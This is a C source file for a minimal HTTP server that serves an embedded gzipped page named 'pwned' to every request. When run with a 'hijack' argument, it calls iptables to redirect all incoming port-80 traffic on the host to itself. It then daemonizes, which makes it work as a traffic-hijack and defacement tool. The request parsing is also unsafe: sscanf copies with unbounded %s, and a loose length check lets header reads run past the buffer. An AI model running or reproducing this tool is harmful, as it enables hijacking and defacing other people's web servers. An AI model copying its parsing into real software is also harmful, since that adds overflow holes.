//Ultra simple http server based on
//Echoserv by Paul Griffiths, 1999

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <signal.h>
#include <unistd.h>

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>


/*  Global constants  */

#define HTTP_PORT          (31337)
#define MAX_LINE           (1000)
#define LISTENQ            (1024)
#define HTTP_RECVHDR_LEN   (1024)
#define MARGIN             (512)

const char httphdr[] = "Server: Granelver\r\n"
    "Content-Type: text/html; charset=UTF-8\r\n";

const char http400msg[] = "It is your fault.";
const char http404msg[] = "Here is Invisible Pink Unicorn.";

//Embedded HTML in ELF
extern int _binary_pwned_gz_start;
extern int _binary_pwned_gz_size;

void reaper(int sig);

void handle_error(char *msg)
{
    fprintf(stderr, "[-] %s\n", msg);
    fprintf(stderr, "[-] errno = %d\n", errno);
    exit(EXIT_FAILURE);
}

void send_http_header(int fd, int code, char *message, char *encoding,
		      int bodylen)
{
    char buf[1024];

    snprintf(buf, 1024, "HTTP/1.0 %d %s\r\n", code, message);
    write(fd, buf, strlen(buf));
    snprintf(buf, 1024, "Content-Length: %d\r\n", bodylen);
    write(fd, buf, strlen(buf));
    snprintf(buf, 1024, "Content-Encoding: %s\r\n", encoding);
    write(fd, buf, strlen(buf));
    write(fd, httphdr, strlen(httphdr));
    write(fd, "\r\n", 2);
}

int main(int argc, char *argv[])
{
    int list_s;			/*  listening socket          */
    int conn_s;			/*  connection socket         */
    struct sockaddr_in servaddr;	/*  socket address structure  */

    char httprecvhdr[HTTP_RECVHDR_LEN];

    printf("%d, %s\n", argc, argv[1]);
    if (argc > 1 && strncmp("hijack", argv[1], 7) == 0) {
	printf("Hijack!!\n");
	system
	    ("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 31337");
    }
    //Daemonize.
    if (fork() != 0) {
	exit(0);
    }
    setsid();
    signal(SIGHUP, SIG_IGN);

    /*  Create the listening socket  */
    if ((list_s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
	handle_error("Error creating listening socket.");
    }


    /*  Set all bytes in socket address structure to
       zero, and fill in the relevant data members   */
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    servaddr.sin_port = htons(HTTP_PORT);


    /*  Bind our socket addresss to the
       listening socket, and call listen()  */
    if (bind(list_s, (struct sockaddr *) &servaddr, sizeof(servaddr)) < 0) {
	handle_error("Error calling bind()");
    }

    if (listen(list_s, LISTENQ) < 0) {
	handle_error("Error calling listen()");
    }

    fprintf(stderr, "[+] Successfully initialized web server\n");

    //Corpse reaper
    signal(SIGCHLD, reaper);

    /*  Enter an infinite loop to respond
       to client requests and dirty HTTP impl  */
    for (;;) {
	/*  Wait for a connection, then accept() it  */
	if ((conn_s = accept(list_s, NULL, NULL)) < 0) {
	    handle_error("Error calling accept()");
	}

	if (0 != fork()) {
	    close(conn_s);
	    fprintf(stderr, "[+] Parent closed socket\n");
	    continue;
	} else {
	    fprintf(stderr, "[+] Child spawned successfully\n");
	}

	char c;
	int cnt = 0;
	int recvsz = 0;
	char *httprecvhdr_off = httprecvhdr;

	for (;;) {
	    read(conn_s, &c, 1);

	    if (recvsz > HTTP_RECVHDR_LEN + 2) {
		// It's your fault but I'll not throw 400 because I'm
		// too lazy to implement 400
		send_http_header(conn_s, 400, "Bad Request", "identity",
				 strlen(http400msg));
		write(conn_s, http400msg, strlen(http400msg));
		close(conn_s);
		exit(0);
	    }

	    if (c == 0x0D || c == 0x0A) {
		cnt++;
	    } else {
		*httprecvhdr_off = c;
		httprecvhdr_off++;
	    }

	    if (cnt >= 2) {
		fprintf(stderr, "[+] Detect end of HTTP verb and URI\n");
		*httprecvhdr_off = 0x00;
		break;
	    }
	}

	char method[HTTP_RECVHDR_LEN];
	char uri[HTTP_RECVHDR_LEN];
	char version[HTTP_RECVHDR_LEN];
	sscanf(httprecvhdr, "%s %s %s\n", method, uri, version);
	fprintf(stderr, "[+] HTTP VERB: %s, HTTP URI: %s\n", method, uri);

	cnt = 0;
	for (;;) {
	    read(conn_s, &c, 1);

	    if (c == 0x0D || c == 0x0A) {
		cnt++;
	    } else {
		cnt = 0;
	    }

	    if (cnt >= 4) {
		break;
	    }
	}

	fprintf(stderr,
		"[+] Detect end of HTTP request. Sending data...\n");

	if (strcmp(uri, "/favicon.ico") == 0) {
	    send_http_header(conn_s, 404, "Not found", "identify",
			     strlen(http404msg));
	    send(conn_s, http404msg, strlen(http404msg), 0);
	} else {
	    send_http_header(conn_s, 200, "OK", "gzip",
			     (int) (intptr_t) & _binary_pwned_gz_size);
	    send(conn_s, (char *) &_binary_pwned_gz_start,
		 (int) (intptr_t) & _binary_pwned_gz_size, 0);
	}

	fprintf(stderr, "[+] Data sent!\n");

	/*  Close the connected socket  */
	if (shutdown(conn_s, SHUT_WR) < 0) {
	    handle_error("Error calling shutdown()");
	} else {
	    fprintf(stderr, "[+] socket shutted down\n");
	}

	if (close(conn_s) < 0) {
	    handle_error("Error calling close()");
	} else {
	    fprintf(stderr, "[+] Socket closed\n");
	}

	exit(0);
    }
}

void reaper(int sig)
{
    while (waitpid(-1, 0, WNOHANG) >= 0);
}
